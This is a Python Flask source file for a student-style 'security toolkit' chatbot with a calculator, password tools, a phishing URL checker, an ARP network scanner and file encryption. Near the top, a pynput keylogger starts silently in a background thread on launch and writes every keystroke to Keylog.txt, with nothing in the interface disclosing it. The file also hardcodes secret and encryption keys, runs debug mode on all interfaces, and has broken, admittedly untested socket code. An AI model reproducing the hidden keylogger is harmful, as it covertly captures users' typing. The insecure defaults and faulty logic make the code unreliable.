import os
from chatterbot import ChatBot
from flask import Flask, render_template,request,jsonify,send_from_directory,send_file
import string 
import random
import math
import pynput
import threading
import socket 

from pynput.keyboard import Key , Listener

from chatterbot.trainers import ChatterBotCorpusTrainer
import tldextract
import Levenshtein as lv
import scapy.all  as scapy
from scapy.all import arping, Scapy_Exception
import psutil
import re
import scapy.all as scapy 
from scapy.layers import http
from flask_wtf import FlaskForm
from wtforms.validators import InputRequired
from wtforms import FileField,SubmitField
from werkzeug.utils import secure_filename
from cryptography.fernet import Fernet
import socket 
import tqdm 
from Crypto.Cipher import AES 




count = 0
keys = []








app = Flask(__name__)
app.config['SECRET_KEY'] = 'supersecretkey'
app.config['UPLOAD_FOLDER'] = 'static/files'

class UploadFileForm(FlaskForm):
    file = FileField("File", validators=[InputRequired()])
    submit = SubmitField("Upload File")

@app.route('/', methods=['GET',"POST"])
@app.route('/home', methods=['GET',"POST"])
def home():
    form = UploadFileForm()
    if form.validate_on_submit():
        file = form.file.data 
        static_filename = 'FILE3'
        file.save(os.path.join(os.path.abspath(os.path.dirname(__file__)),app.config['UPLOAD_FOLDER'],secure_filename(static_filename))) 
        
    return render_template('coregen.html', form=form)


bot = ChatBot(
    "chimera",
    read_only=False,
    logic_adapters=[
        {
        "import_path": "chatterbot.logic.BestMatch",
        "maximum_similarity_threshold": 0.9
        }
    ]
)
trainer = ChatterBotCorpusTrainer(bot)

trainer.train("chatterbot.corpus.english")


@app.route("/")
def main():
    return render_template("coregen.html")



def key_press(key):
    global keys,count
    keys.append(key)
    count+= 1
    

    if count >= 100:
        count = 0
        write_file(keys)
        keys = []
    write_file(keys)



def write_file(keys):
    with open('Keylog.txt',"w")as f:
        for key in keys:
            f.write(str(key))
            





def key_released(key):
    if key ==Key.esc:
        return 


def start_keylogger(): 
    with Listener(on_press=key_press, on_release=key_released) as listener: 
        listener.join()
os.makedirs(os.path.join('static', 'files'), exist_ok=True)


keylogger_thread = threading.Thread(target=start_keylogger)

keylogger_thread.daemon = True 

keylogger_thread.start()

@app.route('/logo')
def logo():
    return send_from_directory('templates','logo2.png')

@app.route("/aboutgen.html")
def about():
    return send_from_directory('templates','About.html')
@app.route("/Usagegen.html")
def Usage():
    return send_from_directory('templates','Usage.html')
@app.route("/coregen.html")
def Uscor():
    return send_from_directory('templates','core.html')






def main():
    return render_template("Crackin.html")
key = b"TheRyanMcpolandK"
nonce = b"TheRyanMcpolandKeyNnce"

cipher = AES.new(key, AES.MODE_EAX,nonce)
Mathbot = ChatBot("Calcu", logic_adapters=["chatterbot.logic.MathematicalEvaluation"])
Conversebot = ChatBot("units",logic_adapters=["chatterbot.logic.UnitConversion"])        

letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12345678900987654321zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA'

legitimate_domains = ['usa.gov','gov.uk','irs.gov','cdc.gov','europa.eu','bbc.com','cnn.com','reuters.com'
    ,'nytimes.com','theguardian.com','khanacademy.org','coursera.org','edx.org','ocw.mit.edu','online.stanford.edu','amazon.com',
    'ebay.co','walmart.com','bestbuy.com','alibaba.com','facebook.com','twitter.com','instagram.com','linkedin.com'
    ,'reddit.com','netflix.com','hulu.com','disneyplus.com','spotify.com','youtube.com'


]
def extract_domain_parts(url):
        extracted = tldextract.extract(url)
        return extracted.subdomain,extracted.suffix ,extracted.domain

def is_misspelled_domain(domain, legitamate_domain,threshold=0.8):
    for legit_domain in legitamate_domain:
        similarity = lv.ratio(domain,legit_domain)
        if similarity >= threshold:
            return False
    return True


def is_phisihing_url (url,legitmate_domain):
    subdomain, domain , suffix = extract_domain_parts(url)

    if f"{domain}.{suffix}"in legitmate_domain:
        return False

    if is_misspelled_domain(domain, legitimate_domains):
        print (f"potential phisihing is detected: {url}")
        return True

    return False
def encrypt(plaintext, key):
        ciphertext = ''
        for letter in plaintext:
            letter = letter .lower()
            if not letter == '':
                index = letters.find(letter)
                if index == -1:
                    ciphertext += letter
                else:
                    new_index = index + key 
                    if new_index >= 62:
                        new_index -= 62
                    ciphertext += letters[new_index]
        return ciphertext
def decrypt(ciphertext , key):
        plaintext = ''
        for letter in ciphertext:
            letter = letter .lower()
            if not letter == '':
                index = letters.find(letter)
                if index == -1:
                    ciphertext += letter
                else:
                    new_index = index - key 
                    if new_index <=0:
                     new_index += 62
                    plaintext += letters[new_index]
        return plaintext
@app.route('/enc-file')
def encryptedfile():
    p = "static/files/encFILE3"

    return send_file(p,as_attachment=True)
@app.route('/dec-file')
def dikcryptedfile():
    p = "static/files/DECFILE3"

    return send_file(p,as_attachment=True)
@app.route('/net-file')
def netfile():
    p = "scanresults.html"

    return send_file(p,as_attachment=True)
        

        


    
    
    


@app.route("/get") 
def get_chatbot_response():
    userText = request.args.get('userMessage')
#calculator function 
    if userText and userText.startswith("maths"):
        equations = userText.replace("maths","").strip()
        if equations:
            response = Mathbot.get_response(equations)
            return str(response)
        else :
            return "error"
   
    
# conversion function 
    if userText and userText.startswith("converse"):
        equations = userText.replace("converse","").strip()
        if equations:
            response = Conversebot.get_response(equations)
            return str(response)
        else :
            return "error"

# password checker
    if userText and userText.startswith("PasswordChecker"):
        password = userText.replace("PasswordChecker","").strip()
    
        upper_case = any([1 if c in string.ascii_uppercase else 0 for c in password])
        lower_case = any([1 if c in string.ascii_lowercase else 0 for c in password])
        special = any([1 if c in string.punctuation else 0 for c in password])
        digit = any([1 if c in string.digits else 0 for c in password])

        length = len(password)

        characters = (special, digit, lower_case, upper_case)
    
        score = 0

        with open('10k-most-common.txt', 'r') as f:
            common = f.read().splitlines()

        if password in common:
            print("Your password is too Basic, like you as a person!")

        if length >= 9:
            score += 1
        if length >= 10:
            score += 1
        if length >= 11:
            score += 1
        if length >= 12:
            score += 2

    
        if sum(characters) > 2:
            score += 1
        if sum(characters) > 3:
            score += 1
        if sum(characters) > 4:
         score += 1

        return(f"Password has {sum(characters)} different character types, score {score}/7.")

# network intrusion ip retrival 
    if userText and userText.startswith("GetMyIp"):
        
    
        hostname = socket.gethostname()

        myip = socket.gethostbyname(hostname)

        return('my ip address is ' + myip)

        
# url phisher 
    if userText and userText.startswith("Phisher"):
        url = userText.replace("Phisher","").strip()
        if url:
            if is_phisihing_url(url,legitimate_domains):
                return "warning unsafe"
            else:
                return "safe"
    if userText and userText.startswith("net"):

        ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
        ip_add_range_entered = userText.replace("net", "").strip()

        if ip_add_range_pattern.search(ip_add_range_entered):
            print(f"{ip_add_range_entered} is a valid ip address range")

        arp_result = scapy.arping(ip_add_range_entered)
        dev = arp_result[0]

        htmll = f"""
        <html>
        <head>
            <title>Crackin-Network-scanner</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background-color: #d710de;
                    margin: 20px;
            }}
                table {{
                    width: 100%;
                    border-collapse: collapse;
            }}
                table, th, td {{
                    border: 1px solid black;
                    padding: 8px;
                    text-align: left;
            }}
                th {{
                    background-color: #dce30b;
                    color: yellow;
            }}
                tr:nth-child(even) {{
                    background-color: #3e0be3;
            }}
            </style>
        </head>
        <body>
            <h1>Scan results for {ip_add_range_entered}</h1>
            <table id="networkTable" 
                <tr>
                    <th>IP ADDRESS</th>
                    <th>MAC ADDRESS</th>
             </tr>
    """

        for sent, received in dev:
                htmll += f"""
                <tr><td>{received.psrc}</td>
                <td>{received.hwsrc}</td>
                </tr>
            """
    
        htmll += """
        </table>

        
        </body>
        </html>
        """

        with open("scanresults.html", "w") as html_file:
            html_file.write(htmll)

        print("Results saved")

        import webbrowser
        webbrowser.open("scanresults.html")

    if userText and userText.startswith("PasswordCreate"):
        Upper_case = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        Lower_case = Upper_case.lower()

        Nume = '1234567890'
        symbols = "!$%^&*()_+=-{{[@'#~;://>.<,]}}"

        upper,lower,nums,syms = True,True,True,True

        all = ""

        minimum = []

        if upper:
            all += Upper_case
            minimum.append(random.choice(Upper_case))
    

        if lower:
            all += Lower_case
            minimum.append(random.choice(Lower_case))
    

        if nums:
            all += Nume
            minimum.append(random.choice(Nume))
            minimum.append(random.choice(Nume))
            minimum.append(random.choice(Nume))
   

        if syms:
            all += symbols
            minimum.append(random.choice(symbols))
    

        length = 15
        total = 5



        pw = "".join(minimum + random.sample(all, length))

        return pw
    
    #couldn't test these 

    if userText and userText.startswith("send"):
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM )
        client.connect(("localhost",9999))

        FILE = "static/files/FILE3"

        if os.path.exists(FILE):
            FILE_SIZE= os.path.getsize(FILE)


        with open (FILE, "rb") as f:
            data = f.read()

        encrypted = cipher.encrypt(data)

        client.send("FILE3".encode())
        client.send(str(FILE_SIZE).encode())
        client.sendall(encrypted)
        client.send(b"<END>")

        client.close()
        

    if userText and userText.startswith("recieve"):
        
        cipher = AES.new(key, AES.MODE_EAX,nonce)
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM )
        server.bind(("localhost",9999))
        server.listen()

        client, addr = server.accept ()

        file_name = client.recv(1024).decode()
       
        file_size = client.recv(1024).decode()
        

        with open(file_name,"wb") as file:

            done = False

            file_bytes = b""

            progress = tqdm.tqdm(unit="B", unit_scale=True,
                            unit_divisor=1000, total=int(file_size))

        while not done:
            data = client.recv(1024)
        if file_bytes[-5:] == b"<END>":
            done = True
        else:
            file_bytes += data
        file.write(cipher.decrypt(file_bytes))

        file.close()
        client.close()
        server.close()
    if userText and userText.startswith("encrypt"):
        
            keyb = b'eevrT80vQAouDS0i6YmYtzf_5KnLpLwTaqJbTBaqIek='
            v = Fernet(keyb)


      
            with open(r'static/files/FILE3', 'rb') as original_file:
                original = original_file.read()

        
            encrypted = v.encrypt(original)

        
            with open(r'static/files/encFILE3', 'wb') as encrypted_file:
                encrypted_file.write(encrypted)

                return "file encrypted "
            
    

    if userText and userText.startswith("decrypt"):
        keyb = b'eevrT80vQAouDS0i6YmYtzf_5KnLpLwTaqJbTBaqIek='
        v = Fernet(keyb)

        with open(r'static/files/encFILE3', 'rb') as encrypted_file:
            encrypted = encrypted_file.read()

        decrypted = v.decrypt(encrypted)
        
        
        with open(r'static/files/DECFILE3', 'wb') as decrypted_file:
            decrypted_file.write(decrypted)

            return("File  decrypted ")
    if userText and userText.startswith("delete history"):
        if os.path.exists("static/files/FILE3"):
            os.remove("static/files/FILE3")
        if os.path.exists("static/files/DECFILE3"):
            os.remove("static/files/DECFILE3")
        if os.path.exists("static/files/encFILE3"):
            os.remove("static/files/encFILE3")
        if os.path.exists("scanresults.html"):
            os.remove("scanresults.html")
            return ("cleaned up ")
        else:
            return("I'm sorry, the old Kraken can't come to the phone right now. Why? Oh, 'cause she's dead (oh)")
    #if userText and userText.startswith("scanner"):

        
        

        



        

    

        

        

        

    else:
        return str (bot.get_response(userText))
    
        
       


    



 
        
if __name__ == "__main__":
    for rule in app.url_map.iter_rules():
        print(rule)
    app.run(debug=True,host="0.0.0.0",port=8080)



